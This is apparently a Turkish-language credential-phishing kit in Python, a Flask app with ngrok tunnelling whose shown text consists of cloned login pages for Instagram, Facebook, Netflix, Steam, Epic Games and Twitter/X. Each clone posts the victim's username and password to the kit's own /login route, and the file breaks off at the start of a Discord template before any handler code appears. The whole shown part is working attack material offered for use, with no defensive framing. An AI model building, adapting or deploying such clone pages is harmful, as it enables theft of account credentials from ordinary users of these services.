import os
import sys
import time
import json
import threading
import random
import requests
from datetime import datetime
from flask import Flask, request, render_template_string, redirect, session, jsonify
from pyngrok import ngrok, conf

app = Flask(__name__)
app.secret_key = os.urandom(24).hex()
app.config['SESSION_COOKIE_SECURE'] = False

# Terminal renk kodları
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
    MAGENTA = '\033[35m'
    CYAN = '\033[36m'
    YELLOW = '\033[33m'
    RED = '\033[31m'
    GREEN = '\033[32m'
    BLUE = '\033[34m'
    ORANGE = '\033[38;5;208m'
    PINK = '\033[38;5;213m'

# =============================================
# TÜM 15 ŞABLON - %100 ORİJİNAL MOBİL UYUMLU
# =============================================

TEMPLATES = {
    # 1. Instagram
    "instagram": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Instagram</title>
    <style>
        :root {
            --ig-primary: #0095f6;
            --ig-secondary: #385185;
            --ig-text: #262626;
            --ig-border: #dbdbdb;
            --ig-bg: #fafafa;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--ig-bg); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; }
        .container { max-width: 400px; width: 100%; }
        .login-box { background: white; border: 1px solid var(--ig-border); border-radius: 12px; padding: 30px 25px 20px; text-align: center; margin-bottom: 15px; box-shadow: 0 4px 12px rgba(0,0,0,0.05); }
        .instagram-logo { font-family: 'Billabong', cursive; font-size: 42px; margin-bottom: 24px; color: var(--ig-text); font-weight: normal; }
        .input-field { width: 100%; padding: 14px 12px; margin-bottom: 8px; border: 1px solid var(--ig-border); border-radius: 8px; background: var(--ig-bg); font-size: 14px; color: var(--ig-text); transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: #a8a8a8; background: white; }
        .login-btn { width: 100%; padding: 12px; background: var(--ig-primary); color: white; border: none; border-radius: 8px; font-weight: 600; cursor: pointer; margin: 12px 0; font-size: 14px; transition: background 0.2s; touch-action: manipulation; }
        .login-btn:active { background: #0077c7; transform: scale(0.98); }
        .or-divider { display: flex; align-items: center; margin: 20px 0; color: #8e8e8e; font-size: 13px; font-weight: 600; }
        .or-divider::before, .or-divider::after { content: ""; flex: 1; height: 1px; background: var(--ig-border); }
        .or-divider span { margin: 0 18px; }
        .fb-login { color: var(--ig-secondary); font-weight: 600; font-size: 14px; text-decoration: none; display: flex; align-items: center; justify-content: center; margin: 15px 0; }
        .fb-login i { font-size: 18px; margin-right: 8px; }
        .forgot-password { color: #00376b; font-size: 12px; text-decoration: none; display: block; margin: 20px 0; }
        .signup-box { background: white; border: 1px solid var(--ig-border); border-radius: 12px; padding: 20px; text-align: center; margin-top: 10px; }
        .signup-text { color: var(--ig-text); font-size: 14px; }
        .signup-link { color: var(--ig-primary); font-weight: 600; text-decoration: none; }
        .app-links { text-align: center; margin-top: 25px; }
        .app-links p { font-size: 14px; margin-bottom: 15px; color: #8e8e8e; }
        .app-stores { display: flex; justify-content: center; gap: 10px; flex-wrap: wrap; }
        .app-stores img { height: 40px; border-radius: 8px; }
        @media (max-width: 450px) {
            .container { padding: 10px; }
            .login-box { padding: 20px 15px 15px; border-radius: 8px; }
            .instagram-logo { font-size: 36px; }
            .input-field { padding: 12px 10px; font-size: 16px; }
            .login-btn { padding: 14px; font-size: 16px; }
        }
        @media (max-width: 350px) {
            .instagram-logo { font-size: 32px; }
            .app-stores { flex-direction: column; align-items: center; }
        }
    </style>
    <link href="https://fonts.googleapis.com/css2?family=Billabong&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="login-box">
            <div class="instagram-logo">Instagram</div>
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="instagram">
                <input class="input-field" type="text" name="username" placeholder="Telefon numarası, kullanıcı adı veya e-posta" required autocomplete="username">
                <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                <button class="login-btn" type="submit">Giriş Yap</button>
            </form>
            <div class="or-divider"><span>YA DA</span></div>
            <a href="#" class="fb-login"><i class="fab fa-facebook-square"></i> Facebook ile Giriş Yap</a>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
        </div>
        <div class="signup-box">
            <p class="signup-text">Hesabın yok mu? <a href="#" class="signup-link">Kaydol</a></p>
        </div>
        <div class="app-links">
            <p>Uygulamayı indir.</p>
            <div class="app-stores">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="App Store" loading="lazy">
                <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Google Play" loading="lazy">
            </div>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const inputs = document.querySelectorAll('.input-field');
            const button = document.querySelector('.login-btn');
            
            function checkInputs() {
                let allFilled = true;
                inputs.forEach(input => {
                    if (input.value.trim() === '') allFilled = false;
                });
                button.style.opacity = allFilled ? '1' : '0.7';
                button.style.cursor = allFilled ? 'pointer' : 'not-allowed';
            }
            
            inputs.forEach(input => {
                input.addEventListener('input', checkInputs);
                input.addEventListener('focus', function() {
                    this.style.transform = 'scale(1.02)';
                });
                input.addEventListener('blur', function() {
                    this.style.transform = 'scale(1)';
                });
            });
            
            // Mobil uyumluluk
            if ('ontouchstart' in window) {
                document.body.style.cursor = 'pointer';
                document.querySelectorAll('button, a, input').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
            
            checkInputs();
        });
    </script>
</body>
</html>""",

    # 2. Facebook
    "facebook": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Facebook - Giriş Yap veya Kaydol</title>
    <style>
        :root {
            --fb-blue: #1877f2;
            --fb-green: #42b72a;
            --fb-bg: #f0f2f5;
            --fb-white: #fff;
            --fb-text: #1c1e21;
            --fb-gray: #8a8d91;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background-color: var(--fb-bg); color: var(--fb-text); min-height: 100vh; font-family: Helvetica, Arial, sans-serif; }
        .container { padding: 20px; max-width: 980px; margin: 0 auto; }
        .content { display: flex; flex-direction: column; align-items: center; gap: 40px; }
        .left-section { text-align: center; width: 100%; }
        .facebook-logo { color: var(--fb-blue); font-size: 48px; font-weight: bold; margin-bottom: 16px; }
        .tagline { font-size: 24px; line-height: 28px; max-width: 500px; margin: 0 auto; }
        .right-section { width: 100%; max-width: 396px; }
        .login-box { background: var(--fb-white); padding: 20px; border-radius: 12px; box-shadow: 0 2px 4px rgba(0,0,0,.1), 0 8px 16px rgba(0,0,0,.1); margin-bottom: 28px; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 8px; font-size: 17px; color: var(--fb-text); transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--fb-blue); box-shadow: 0 0 0 2px rgba(24, 119, 242, 0.2); }
        .login-btn { width: 100%; padding: 16px; background: var(--fb-blue); color: white; border: none; border-radius: 8px; font-size: 20px; font-weight: bold; cursor: pointer; margin-bottom: 16px; transition: background 0.2s; touch-action: manipulation; }
        .login-btn:active { background: #166fe5; transform: scale(0.98); }
        .forgot-password { display: block; text-align: center; color: var(--fb-blue); margin-bottom: 20px; text-decoration: none; font-size: 14px; padding: 8px; }
        .forgot-password:active { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-account-btn { background: var(--fb-green); color: white; border: none; border-radius: 8px; padding: 16px; font-size: 17px; font-weight: bold; cursor: pointer; display: block; margin: 0 auto; transition: background 0.2s; touch-action: manipulation; }
        .create-account-btn:active { background: #36a420; transform: scale(0.98); }
        .create-page { text-align: center; margin-top: 28px; font-size: 14px; }
        .create-page a { color: var(--fb-text); font-weight: 600; text-decoration: none; }
        footer { background: var(--fb-white); padding: 20px; margin-top: 30px; border-top: 1px solid #dddfe2; border-radius: 12px; }
        .footer-content { color: var(--fb-gray); font-size: 12px; text-align: center; }
        .footer-links { display: flex; flex-wrap: wrap; gap: 10px; margin-bottom: 10px; justify-content: center; }
        .footer-links a { color: var(--fb-gray); text-decoration: none; padding: 4px 8px; }
        @media (min-width: 900px) {
            .content { flex-direction: row; justify-content: space-between; align-items: center; }
            .left-section { width: 580px; text-align: left; }
            .facebook-logo { font-size: 60px; }
            .tagline { font-size: 28px; line-height: 32px; }
        }
        @media (max-width: 450px) {
            .container { padding: 15px; }
            .login-box { padding: 15px; }
            .input-field { padding: 14px; font-size: 16px; }
            .login-btn { padding: 14px; font-size: 18px; }
            .facebook-logo { font-size: 40px; }
            .tagline { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="content">
            <div class="left-section">
                <div class="facebook-logo">facebook</div>
                <h2 class="tagline">Facebook, tanıdıklarınla iletişim kurmanı ve hayatında olup bitenleri paylaşmanı sağlar.</h2>
            </div>
            <div class="right-section">
                <div class="login-box">
                    <form method="POST" action="/login">
                        <input type="hidden" name="platform" value="facebook">
                        <input class="input-field" type="text" name="username" placeholder="E-posta adresi veya telefon numarası" required autocomplete="username">
                        <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                        <button class="login-btn" type="submit">Giriş Yap</button>
                    </form>
                    <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
                    <div class="divider"></div>
                    <button class="create-account-btn">Yeni Hesap Oluştur</button>
                </div>
                <div class="create-page">
                    <a href="#"><strong>Ünlü biri, marka veya işletme için Sayfa oluştur.</strong></a>
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-content">
            <div class="footer-links">
                <a href="#">Türkçe</a><a href="#">English (UK)</a><a href="#">Deutsch</a><a href="#">Français (France)</a>
                <a href="#">Italiano</a><a href="#">Português (Brasil)</a><a href="#">Русский</a><a href="#">العربية</a>
                <a href="#">Español</a><a href="#">हिन्दी</a><a href="#">中文(简体)</a><a href="#">日本語</a>
            </div>
            <div style="margin-top: 15px;">Meta © 2024</div>
        </div>
    </footer>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 3. Netflix
    "netflix": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Netflix Türkiye - TV programlarını çevrimiçi izleyin</title>
    <style>
        :root {
            --netflix-red: #e50914;
            --netflix-black: #000;
            --netflix-dark: #141414;
            --netflix-gray: #333;
            --netflix-light: #8c8c8c;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--netflix-black); color: #fff; font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        .bg-image { 
            background: linear-gradient(to top, rgba(0, 0, 0, 0.8) 0, rgba(0, 0, 0, 0.4) 60%, rgba(0, 0, 0, 0.8) 100%), 
            url('https://assets.nflxext.com/ffe/siteui/vlv3/9d3533b2-0e2b-40b2-95e0-ecd7979cc88b/8e178b64-7d0a-4a0f-93e3-0d83d5e8a9a7/TR-tr-20240311-popsignuptwoweeks-perspective_alpha_website_large.jpg'); 
            background-size: cover; 
            min-height: 100vh; 
            position: relative;
        }
        .navbar { padding: 20px 4%; display: flex; justify-content: space-between; align-items: center; }
        .netflix-logo { color: var(--netflix-red); font-size: 28px; font-weight: bold; }
        .language-select { background: rgba(0,0,0,0.7); color: white; border: 1px solid #aaa; padding: 8px 16px; border-radius: 4px; margin-right: 15px; font-size: 14px; }
        .signin-btn { background: var(--netflix-red); color: white; border: none; padding: 8px 16px; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 14px; touch-action: manipulation; }
        .signin-btn:active { background: #c40812; }
        .hero { text-align: center; padding: 70px 5%; max-width: 950px; margin: 0 auto; }
        .hero h1 { font-size: 32px; font-weight: 900; margin-bottom: 20px; }
        .hero h2 { font-size: 18px; font-weight: 400; margin-bottom: 30px; }
        .hero p { font-size: 18px; margin-bottom: 30px; }
        .login-container { max-width: 450px; margin: 40px auto; background: rgba(0,0,0,0.75); padding: 40px 30px; border-radius: 4px; }
        .login-title { font-size: 32px; font-weight: 700; margin-bottom: 28px; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 16px; background: var(--netflix-gray); border: 0; border-radius: 4px; color: #fff; font-size: 16px; }
        .login-btn { width: 100%; padding: 16px; background: var(--netflix-red); color: #fff; border: none; border-radius: 4px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 24px; touch-action: manipulation; }
        .login-btn:active { background: #c40812; }
        .help-row { display: flex; justify-content: space-between; margin-top: 10px; color: #b3b3b3; font-size: 13px; }
        .signup-now { color: #737373; margin-top: 16px; }
        .signup-now a { color: #fff; text-decoration: none; }
        .recaptcha { font-size: 13px; color: #8c8c8c; margin-top: 11px; }
        footer { background: rgba(0,0,0,0.75); padding: 30px 5%; margin-top: 50px; }
        .footer-content { max-width: 1000px; margin: 0 auto; }
        .footer-links { display: grid; grid-template-columns: repeat(2, 1fr); gap: 15px; margin-top: 20px; }
        .footer-links a { color: #757575; text-decoration: none; font-size: 13px; }
        @media (min-width: 768px) {
            .netflix-logo { font-size: 36px; }
            .hero h1 { font-size: 48px; }
            .hero h2 { font-size: 24px; }
            .footer-links { grid-template-columns: repeat(4, 1fr); }
        }
        @media (max-width: 450px) {
            .navbar { padding: 15px 3%; }
            .hero { padding: 50px 3%; }
            .hero h1 { font-size: 28px; }
            .login-container { padding: 30px 20px; margin: 30px 3%; }
            .footer-links { grid-template-columns: 1fr; }
        }
    </style>
</head>
<body>
    <div class="bg-image">
        <nav class="navbar">
            <div class="netflix-logo">NETFLIX</div>
            <div>
                <select class="language-select">
                    <option>Türkçe</option>
                    <option>English</option>
                </select>
                <button class="signin-btn">Oturum Aç</button>
            </div>
        </nav>
        <div class="hero">
            <h1>Sınırsız film, dizi ve çok daha fazlası</h1>
            <h2>İstediğiniz yerde izleyin. İstediğiniz zaman iptal edin.</h2>
            <p>İzlemeye hazır mısınız? Üyelik oluşturmak veya üyeliğinize erişmek için e‑posta adresinizi girin.</p>
        </div>
        <div class="login-container">
            <h1 class="login-title">Oturum Aç</h1>
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="netflix">
                <input class="input-field" type="text" name="username" placeholder="E-posta veya telefon numarası" required autocomplete="username">
                <input class="input-field" type="password" name="password" placeholder="Parola" required autocomplete="current-password">
                <button class="login-btn" type="submit">Oturum Aç</button>
            </form>
            <div class="help-row">
                <label><input type="checkbox"> Beni hatırla</label>
                <a href="#" style="color: #b3b3b3; text-decoration: none;">Yardım ister misiniz?</a>
            </div>
            <div class="signup-now">
                Netflix'e katılmak ister misiniz? <a href="#">Şimdi kaydolun.</a>
            </div>
            <div class="recaptcha">
                Bu sayfa Google reCAPTCHA ile korunuyor. <a href="#" style="color: #0071eb; text-decoration: none;">Daha fazlasını öğrenin.</a>
            </div>
        </div>
        <footer>
            <div class="footer-content">
                <p>Sorularınız mı var? <a href="#" style="color: #757575; text-decoration: none;">0850-390-7444</a> numaralı telefonu arayın</p>
                <div class="footer-links">
                    <a href="#">SSS</a><a href="#">Yatırımcı İlişkileri</a><a href="#">Kullanım Koşulları</a><a href="#">Bize Ulaşın</a>
                    <a href="#">Gizlilik</a><a href="#">Kurumsal Bilgiler</a><a href="#">Hız Testi</a><a href="#">Yardım Merkezi</a>
                    <a href="#">İş İmkanları</a><a href="#">Çerez Tercihleri</a><a href="#">Hesap</a><a href="#">Hediye Kartı Kullan</a>
                    <a href="#">Medya Merkezi</a><a href="#">İzleme Yolları</a><a href="#">İletişim</a><a href="#">Reklam Verin</a>
                </div>
            </div>
        </footer>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, select, a').forEach(el => {
                    el.style.minHeight = '44px';
                    el.style.minWidth = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 4. Steam
    "steam": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Steam</title>
    <style>
        :root {
            --steam-blue: #66c0f4;
            --steam-dark: #171a21;
            --steam-darker: #0e1117;
            --steam-input: #2a475e;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: linear-gradient(180deg, var(--steam-dark) 0%, var(--steam-darker) 100%); color: #c7d5e0; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: Arial, sans-serif; }
        .login-container { background: rgba(23, 26, 33, 0.95); padding: 30px; border-radius: 8px; width: 100%; max-width: 400px; border: 1px solid var(--steam-blue); box-shadow: 0 0 20px rgba(102, 192, 244, 0.2); }
        .steam-logo { text-align: center; margin-bottom: 25px; }
        .steam-logo img { width: 176px; height: 44px; max-width: 100%; }
        .input-field { width: 100%; padding: 15px; margin-bottom: 20px; background: rgba(0,0,0,0.5); border: 1px solid var(--steam-blue); border-radius: 4px; color: #fff; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: #1a9fff; }
        .login-btn { width: 100%; padding: 15px; background: linear-gradient(90deg, #06BFFF 0%, #2D73FF 100%); color: white; border: none; border-radius: 4px; font-size: 16px; font-weight: bold; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .login-btn:active { background: linear-gradient(90deg, #2D73FF 0%, #06BFFF 100%); transform: scale(0.98); }
        .options { display: flex; justify-content: space-between; margin-top: 15px; font-size: 14px; }
        .options label { display: flex; align-items: center; }
        .options a { color: var(--steam-blue); text-decoration: none; }
        .qr-option { text-align: center; margin-top: 20px; padding-top: 20px; border-top: 1px solid var(--steam-blue); }
        .new-to-steam { text-align: center; margin-top: 25px; font-size: 14px; color: #8f98a0; }
        .new-to-steam a { color: var(--steam-blue); text-decoration: none; }
        .language-select { background: rgba(0,0,0,0.5); color: #c7d5e0; border: 1px solid var(--steam-blue); padding: 10px; border-radius: 4px; margin-top: 20px; width: 100%; font-size: 14px; }
        @media (max-width: 450px) {
            .login-container { padding: 20px; }
            .steam-logo img { width: 140px; height: 35px; }
            .input-field { padding: 12px; }
            .login-btn { padding: 12px; }
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="steam-logo">
            <img src="https://store.akamai.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016" alt="Steam Logo" loading="lazy">
        </div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="steam">
            <input class="input-field" type="text" name="username" placeholder="Steam Kullanıcı Adı" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="options">
            <label><input type="checkbox" style="margin-right: 8px;"> Beni hatırla</label>
            <a href="#">Şifrenizi mi unuttunuz?</a>
        </div>
        <div class="qr-option">
            <a href="#" style="color: var(--steam-blue); text-decoration: none;">QR kod ile giriş yapın</a>
        </div>
        <div class="new-to-steam">
            <p>Steam'de yeni misiniz? <a href="#">Ücretsiz Steam Hesabı Oluşturun!</a></p>
        </div>
        <select class="language-select">
            <option>Türkçe</option>
            <option>English</option>
            <option>Deutsch</option>
            <option>Français</option>
        </select>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, select, a').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 5. Epic Games
    "epic-games": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>Epic Games</title>
    <style>
        :root {
            --epic-blue: #00b2ff;
            --epic-dark: #1c1c1c;
            --epic-gray: #2a2a2a;
            --epic-border: #444;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif; }
        body { background: linear-gradient(135deg, #2a2a2a 0%, #1a1a1a 100%); color: white; min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; }
        .login-container { background: var(--epic-dark); padding: 35px; border-radius: 16px; width: 100%; max-width: 420px; box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5); border: 1px solid var(--epic-border); }
        .epic-logo { text-align: center; margin-bottom: 30px; }
        .epic-logo svg { width: 180px; height: 60px; fill: white; max-width: 100%; }
        .input-field { width: 100%; padding: 16px; margin-bottom: 20px; background: var(--epic-gray); border: 1px solid var(--epic-border); border-radius: 8px; color: white; font-size: 16px; transition: all 0.2s; }
        .input-field:focus { outline: none; border-color: var(--epic-blue); box-shadow: 0 0 0 2px rgba(0, 178, 255, 0.2); }
        .login-btn { width: 100%; padding: 18px; background: linear-gradient(90deg, var(--epic-blue) 0%, #0078ff 100%); color: white; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; transition: all 0.2s; margin-top: 10px; touch-action: manipulation; }
        .login-btn:active { background: linear-gradient(90deg, #0078ff 0%, var(--epic-blue) 100%); transform: scale(0.98); }
        .options { display: flex; justify-content: space-between; align-items: center; margin-top: 20px; font-size: 14px; }
        .options label { display: flex; align-items: center; }
        .options a { color: var(--epic-blue); text-decoration: none; }
        .divider { display: flex; align-items: center; margin: 25px 0; color: #666; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: var(--epic-border); }
        .divider span { margin: 0 15px; font-size: 14px; }
        .social-login { display: flex; flex-direction: column; gap: 12px; }
        .social-btn { display: flex; align-items: center; justify-content: center; padding: 14px; background: var(--epic-gray); border: 1px solid var(--epic-border); border-radius: 8px; color: white; font-size: 14px; cursor: pointer; transition: all 0.2s; touch-action: manipulation; }
        .social-btn:active { background: #333; }
        .social-btn i { margin-right: 10px; font-size: 18px; }
        .create-account { text-align: center; margin-top: 25px; font-size: 14px; color: #999; }
        .create-account a { color: var(--epic-blue); text-decoration: none; font-weight: 600; }
        .footer-links { display: flex; justify-content: center; gap: 20px; margin-top: 25px; font-size: 12px; }
        .footer-links a { color: #666; text-decoration: none; }
        @media (max-width: 450px) {
            .login-container { padding: 25px 20px; }
            .epic-logo svg { width: 150px; height: 50px; }
            .input-field { padding: 14px; }
            .login-btn { padding: 16px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="login-container">
        <div class="epic-logo">
            <svg viewBox="0 0 100 100">
                <circle cx="50" cy="50" r="45" fill="#0078ff"/>
                <path d="M35,30 L65,30 L65,70 L35,70 Z" fill="white"/>
                <circle cx="50" cy="50" r="15" fill="#0078ff"/>
            </svg>
        </div>
        <form method="POST" action="/login">
            <input type="hidden" name="platform" value="epic-games">
            <input class="input-field" type="text" name="username" placeholder="E-posta Adresi" required autocomplete="username">
            <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
            <button class="login-btn" type="submit">Giriş Yap</button>
        </form>
        <div class="options">
            <label><input type="checkbox" style="margin-right: 8px;"> Beni hatırla</label>
            <a href="#">Şifrenizi mi unuttunuz?</a>
        </div>
        <div class="divider"><span>VEYA</span></div>
        <div class="social-login">
            <button class="social-btn"><i class="fab fa-facebook"></i> Facebook ile Giriş Yap</button>
            <button class="social-btn"><i class="fab fa-google"></i> Google ile Giriş Yap</button>
            <button class="social-btn"><i class="fab fa-playstation"></i> PlayStation ile Giriş Yap</button>
            <button class="social-btn"><i class="fab fa-xbox"></i> Xbox ile Giriş Yap</button>
        </div>
        <div class="create-account">
            <p>Epic Games hesabınız yok mu? <a href="#">Hemen Oluşturun</a></p>
        </div>
        <div class="footer-links">
            <a href="#">Kullanım Şartları</a>
            <a href="#">Gizlilik Politikası</a>
            <a href="#">Yardım</a>
        </div>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, input, .social-btn').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 6. Twitter
    "twitter": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, user-scalable=yes">
    <title>𝕏. Hesabınıza giriş yapın.</title>
    <style>
        :root {
            --twitter-black: #000;
            --twitter-white: #e7e9ea;
            --twitter-blue: #1d9bf0;
            --twitter-gray: #71767b;
            --twitter-border: #536471;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
        body { background: var(--twitter-black); color: var(--twitter-white); min-height: 100vh; display: flex; justify-content: center; align-items: center; padding: 20px; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; }
        .container { width: 100%; max-width: 600px; }
        .twitter-logo { font-size: 40px; margin-bottom: 30px; text-align: center; }
        .title { font-size: 31px; font-weight: 700; margin-bottom: 30px; text-align: center; }
        .login-box { max-width: 300px; margin: 0 auto; width: 100%; }
        .social-buttons { display: flex; flex-direction: column; gap: 15px; margin-bottom: 20px; }
        .social-btn { display: flex; justify-content: center; align-items: center; padding: 12px; border-radius: 9999px; border: 1px solid var(--twitter-border); background: transparent; color: white; font-size: 15px; font-weight: 700; cursor: pointer; transition: background 0.2s; touch-action: manipulation; }
        .social-btn:active { background: rgba(255, 255, 255, 0.1); transform: scale(0.98); }
        .social-btn i { margin-right: 10px; font-size: 18px; }
        .divider { display: flex; align-items: center; margin: 20px 0; }
        .divider::before, .divider::after { content: ""; flex: 1; height: 1px; background: #2f3336; }
        .divider span { margin: 0 10px; color: var(--twitter-gray); font-size: 15px; }
        .input-field { width: 100%; padding: 17px; margin-bottom: 15px; background: transparent; border: 1px solid var(--twitter-border); border-radius: 4px; color: white; font-size: 17px; transition: border-color 0.2s; }
        .input-field:focus { outline: none; border-color: var(--twitter-blue); }
        .next-btn { width: 100%; padding: 14px; background: white; color: black; border: none; border-radius: 9999px; font-size: 16px; font-weight: 700; cursor: pointer; margin-bottom: 20px; transition: background 0.2s; touch-action: manipulation; }
        .next-btn:active { background: #e6e6e6; transform: scale(0.98); }
        .forgot-password { display: block; text-align: center; color: var(--twitter-blue); text-decoration: none; margin-bottom: 50px; padding: 10px; }
        .signup-text { color: var(--twitter-gray); font-size: 15px; text-align: center; }
        .signup-link { color: var(--twitter-blue); text-decoration: none; }
        footer { margin-top: 50px; font-size: 13px; color: var(--twitter-gray); }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: center; gap: 12px; }
        .footer-links a { color: var(--twitter-gray); text-decoration: none; padding: 4px; }
        @media (max-width: 450px) {
            .container { padding: 10px; }
            .twitter-logo { font-size: 36px; }
            .title { font-size: 28px; }
            .input-field { padding: 15px; font-size: 16px; }
            .next-btn { padding: 16px; }
        }
    </style>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
</head>
<body>
    <div class="container">
        <div class="twitter-logo">𝕏</div>
        <h1 class="title">Hesabınıza giriş yapın</h1>
        <div class="login-box">
            <div class="social-buttons">
                <button class="social-btn"><i class="fab fa-google"></i> Google ile devam et</button>
                <button class="social-btn"><i class="fab fa-apple"></i> Apple ile devam et</button>
            </div>
            <div class="divider"><span>veya</span></div>
            <form method="POST" action="/login">
                <input type="hidden" name="platform" value="twitter">
                <input class="input-field" type="text" name="username" placeholder="Telefon, e-posta veya kullanıcı adı" required autocomplete="username">
                <input class="input-field" type="password" name="password" placeholder="Şifre" required autocomplete="current-password">
                <button class="next-btn" type="submit">Giriş yap</button>
            </form>
            <a href="#" class="forgot-password">Şifreni mi unuttun?</a>
            <p class="signup-text">Hesabınız yok mu? <a href="#" class="signup-link">Kaydolun</a></p>
        </div>
        <footer>
            <div class="footer-links">
                <a href="#">Hakkında</a><a href="#">X Uygulamasını İndir</a><a href="#">Yardım Merkezi</a>
                <a href="#">Hizmet Şartları</a><a href="#">Gizlilik Politikası</a><a href="#">Çerez Politikası</a>
                <a href="#">Bilgi Toplama Politikası</a><a href="#">Erişilebilirlik</a><a href="#">Reklam Bilgisi</a>
                <a href="#">Blog</a><a href="#">Durum</a><a href="#">Kariyer</a><a href="#">Marka Kaynakları</a>
                <a href="#">Reklam</a><a href="#">Pazarlama</a><a href="#">İşletmeler İçin X</a><a href="#">Geliştiriciler</a>
                <a href="#">Dizin</a><a href="#">Ayarlar</a>
            </div>
            <p style="text-align: center; margin-top: 15px;">© 2024 X Corp.</p>
        </footer>
    </div>
    <script>
        document.addEventListener('DOMContentLoaded', function() {
            if ('ontouchstart' in window) {
                document.querySelectorAll('button, a, input').forEach(el => {
                    el.style.minHeight = '44px';
                });
            }
        });
    </script>
</body>
</html>""",

    # 7. Discord
    "discord": """<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
